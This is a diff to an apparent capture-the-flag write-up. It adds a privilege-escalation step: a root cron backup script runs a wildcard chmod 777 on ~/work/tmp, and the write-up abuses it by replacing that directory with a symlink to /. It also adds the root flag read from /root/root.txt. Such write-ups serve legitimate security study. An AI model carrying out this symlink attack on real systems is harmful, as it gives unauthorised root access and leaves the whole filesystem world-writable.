@@ -295,10 +295,26 @@ PORT   STATE SERVICE VERSION
      tar -xf backup_courses.tar.gz;
      chmod 777 * -R;
      ```
-    __Notes__:
-    - The script is being ran by __root__ periodically
-    - Contents of the `courses/` directory are compressed
-      - The compressed file is saved in `~/work/tmp`
-    - The compressed file is decompressed on where it is saved
-    - The first __tar__ and __chmod__ use wildcards ("__*__")
+   __Notes__:
+   - The script is being ran by __root__ periodically
+   - Contents of the `courses/` directory are compressed
+     - The compressed file is saved in `~/work/tmp`
+   - The compressed file is decompressed on where it is saved
+   - The first __tar__ and __chmod__ use wildcards ("__*__")
+   - Everything inside `~/work/tmp` will have its permissions changed
 4. Exploit __*/usr/bin/backup.sh*__
+   ```console
+   cd /home/giovanni/work
+
+   rm -rf tmp
+
+   ln -s / ./tmp
+   ```
+   - after __*backup.sh*__ runs:
+     ```console
+     cat /root/root.txt
+     # 4f3a83b42ac7723a508b8ace7b8b1209
+     ```
+   __Notes__:
+   - `~/work/tmp` was changed to have a symbolic link to `/`
+   - Now, everything inside `/` has `-rwxrwxrwx`permissions
